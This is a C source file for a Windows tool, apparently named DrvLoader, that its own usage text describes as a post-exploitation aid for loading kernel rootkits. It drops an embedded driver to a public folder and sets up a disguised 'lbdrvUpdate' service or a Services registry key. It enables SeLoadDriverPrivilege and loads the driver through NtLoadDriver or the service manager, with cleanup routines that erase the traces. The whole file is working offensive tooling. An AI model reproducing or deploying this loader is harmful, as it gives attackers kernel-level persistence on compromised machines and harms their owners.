#include <windows.h>
#include <Stdio.h>
#include <Ntsecapi.h>  
#include <Shlwapi.h>
#include "resource.h"

#pragma comment(lib, "shlwapi.lib")

#define STATUS_IMAGE_ALREADY_LOADED 0xC000010E

typedef NTSTATUS(_stdcall* NT_UNLOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(_stdcall* NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

HMODULE pNtdll = GetModuleHandleA("ntdll.dll");

RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(pNtdll, "RtlInitUnicodeString");

void dropDriverResourceToDisk()
{
	BOOL status = FALSE;

	HRSRC findDriver = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	if (findDriver)
	{
		HGLOBAL loadDriver = LoadResource(NULL, findDriver);
		if (loadDriver)
		{
			DWORD sizeDriver = SizeofResource(NULL, findDriver);
			if (sizeDriver)
			{
				LPVOID lockResource = LockResource(loadDriver);
				if (lockResource)
				{
					HANDLE createDriver = CreateFile(L"C:\\Users\\Public\\lbdrv.sys", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					if (createDriver)
					{
						DWORD dwBytesWritten = 0;
						BOOL writeDriver = WriteFile(createDriver, lockResource, sizeDriver, &dwBytesWritten, NULL);
						if (writeDriver)
						{
							printf("[+] Successfully wrote the driver to disk\n");
						}
					}
					CloseHandle(createDriver);
					FreeResource(findDriver);
				}
			}
		}
	}
}

void checkAdministrator()
{
	HANDLE TokenHandle = NULL;
	BOOL ret = FALSE;
	BOOL openToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &TokenHandle);
	if (openToken)
	{
		TOKEN_ELEVATION tokenElevation = { 0 };
		DWORD ReturnLength = sizeof(TOKEN_ELEVATION);
		BOOL checkToken = GetTokenInformation(TokenHandle, TokenElevation, &tokenElevation, sizeof(tokenElevation), &ReturnLength);
		if (tokenElevation.TokenIsElevated)
		{
			printf("[+] Process is running with an elevated token [Administrator] \n\n");
		}
	}
	CloseHandle(TokenHandle);
}

void enableSeLoadDriverPrivilege()
{
	LUID luid;
	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
	if (currentProc)
	{
		HANDLE TokenHandle(NULL);
		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken)
		{
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeLoadDriverPrivilege", &luid);

			if (!checkToken)
			{
				printf("[+] Current process token already includes SeLoadDriverPrivilege\n");
			}
			else
			{
				TOKEN_PRIVILEGES tokenPrivs;

				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

				if (adjustToken != 0)
				{
					printf("[+] Added SeLoadDriverPrivilege to the current process token\n");
				}
			}
			CloseHandle(TokenHandle);
		}
	}
	CloseHandle(currentProc);
}

void createRegKey()
{
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
	HKEY phkResult;
	DWORD lpdwDisposition;
	WCHAR regPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\lbdrv";

	LSTATUS createKey = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, lpSecurityAttributes, &phkResult, &lpdwDisposition);
	if (createKey == ERROR_SUCCESS)
	{
		printf("[+] Registry key was created up for calling NtLoadDriver\n");

		WCHAR driverPath[MAX_PATH] = { 0 };
		_snwprintf_s(driverPath, MAX_PATH, _TRUNCATE, L"%ws%ws", L"\\??\\", L"C:\\Users\\Public\\lbdrv.sys");

		SIZE_T ImagePathSize = (DWORD)(sizeof(wchar_t) * (wcslen(driverPath) + 1));
		LSTATUS setKeyImagePath = RegSetValueEx(phkResult, L"ImagePath", 0, REG_EXPAND_SZ, (const BYTE*)driverPath, ImagePathSize);

		if (setKeyImagePath == ERROR_SUCCESS)
		{
			printf("[+] Set the [ImagePath] value of the Registry key to the path of the driver\n");
		}

		DWORD lpData1Type = 1;
		LSTATUS setKeyType = RegSetValueExW(phkResult, L"Type", 0, REG_DWORD, (const BYTE*)&lpData1Type, sizeof(DWORD));
		if (setKeyType == ERROR_SUCCESS)
		{
			printf("[+] Set the [Type] value of the Registry key to 1\n");
		}

		DWORD lpData2ErrorControl = 1;
		LSTATUS setKeyTypeErrorControl = RegSetValueExW(phkResult, L"ErrorControl", 0, REG_DWORD, (const BYTE*)&lpData2ErrorControl, sizeof(DWORD));
		if (setKeyType == ERROR_SUCCESS)
		{
			printf("[+] Set the [ErrorControl] value of the Registry key to 1\n");
		}

		DWORD lpData3Start = 3;
		LSTATUS setKeyStart = RegSetValueExW(phkResult, L"Start", 0, REG_DWORD, (const BYTE*)&lpData3Start, sizeof(DWORD));
		if (setKeyType == ERROR_SUCCESS)
		{
			printf("[+] Set the [Start] value of the Registry key to 1\n");
		}
	}
	RegCloseKey(phkResult);
}

void loadDriver()
{
	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(pNtdll, "NtLoadDriver");

	UNICODE_STRING DriverServiceName = { 0 };
	WCHAR regNamePath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\lbdrv";
	RtlInitUnicodeString(&DriverServiceName, regNamePath);

	NTSTATUS loadDrvStatus = NtLoadDriver(&DriverServiceName);

	if (loadDrvStatus == ERROR_SUCCESS)
	{
		printf("[+] Sucessfully loaded the driver into the kernel via NtLoadDriver\n");
	}
	if (loadDrvStatus == STATUS_IMAGE_ALREADY_LOADED)
	{
		printf("[+] Driver is already loaded - STATUS_IMAGE_ALREADY_LOADED\n");
	}
	CloseHandle(pNtdll);
}

void unloadDriver()
{
	enableSeLoadDriverPrivilege();
	NT_UNLOAD_DRIVER NtUnloadDriver = (NT_UNLOAD_DRIVER)GetProcAddress(pNtdll, "NtUnloadDriver");
	UNICODE_STRING DriverServiceName = { 0 };

	WCHAR regNamePath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\lbdrv";
	RtlInitUnicodeString(&DriverServiceName, regNamePath);

	NTSTATUS unloadDrvStatus = NtUnloadDriver(&DriverServiceName);
	if (unloadDrvStatus == ERROR_SUCCESS)
	{
		printf("\n[+] Sucessfully unloaded the driver from the kernel\n");

		LPCWSTR delRegNamePath = L"System\\CurrentControlSet\\Services\\lbdrv";
		LSTATUS delKey = SHDeleteKeyW(HKEY_LOCAL_MACHINE, delRegNamePath);
		if (delKey == ERROR_SUCCESS)
		{
			BOOL delFile = DeleteFile(L"C:\\Users\\Public\\lbdrv.sys");
			if (delFile != 0)
			{
				printf("[+] Performed cleanup, removed keys and files from disk\n");
			}
		}
	}
}

void loadDriverSCM()
{
	dropDriverResourceToDisk();

	LPCSTR lpBinaryPathName = "C:\\Users\\Public\\lbdrv.sys";
	SC_HANDLE hService = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hService != 0)
	{
		LPCSTR lpServiceName = "lbdrvUpdate";
		SC_HANDLE createService = CreateServiceA(hService, lpServiceName, lpServiceName,
			SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
			SERVICE_DEMAND_START,
			SERVICE_ERROR_IGNORE,
			lpBinaryPathName,
			NULL, NULL, NULL, NULL, NULL);

		if (createService)
		{
			BOOL startService = StartService(createService, 0, NULL);
			if (startService)
			{
				printf("[+] Sucessfully created a new service for the driver\n");
			}
		}
		CloseServiceHandle(createService);
	}
	CloseServiceHandle(hService);
	DeleteFileA(lpBinaryPathName);
}

void unloadDriverSCM()
{
	SC_HANDLE openSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (openSCM != NULL)
	{
		LPCSTR lpServiceName = "lbdrvUpdate";
		SC_HANDLE openService = OpenServiceA(openSCM, lpServiceName, SC_MANAGER_ALL_ACCESS);
		if (openService != NULL)
		{
			SERVICE_STATUS sstatus;
			BOOL stopService = ControlService(openService, SERVICE_CONTROL_STOP, &sstatus);
			if (stopService != 0)
			{
				BOOL delService = DeleteService(openService);
				if (delService != 0)
				{
					printf("[+] Sucessfully deleted the driver service\n");
				}
			}
		}
		CloseServiceHandle(openService);
	}
	CloseServiceHandle(openSCM);
}

int main(int argc, char* argv[])
{
	if (argc == 1)
	{
		fprintf(stdout,
			"\nDrvLoader - A post exploitation tool to aid in loading kernel rootkits\n\n"
			"\tUsage        Description\n"
			"\t-----        -----------------------------------------------------------------\n"
			"\t/LOAD        Drop and load a signed kernel driver onto the system with NtLoadDriver\n"
			"\t/UNLOAD      Unload the loaded  driver from the system with NtUnloadDriver\n"
			"\t/LOADSCM     Load the embedded driver resource using the SCM\n"
			"\t/UNLOADSCM   Unload the embedded driver resource using the SCM\n");

		ExitProcess(1);
	}
	if (strcmp(argv[1], "/LOAD") == 0)
	{
		dropDriverResourceToDisk();
		checkAdministrator();
		createRegKey();
		enableSeLoadDriverPrivilege();
		loadDriver();
	}
	if (strcmp(argv[1], "/UNLOAD") == 0)
	{
		unloadDriver();
	}
	if (strcmp(argv[1], "/LOADSCM") == 0)
	{
		loadDriverSCM();
	}
	if (strcmp(argv[1], "/UNLOADSCM") == 0)
	{
		unloadDriverSCM();
	}
}
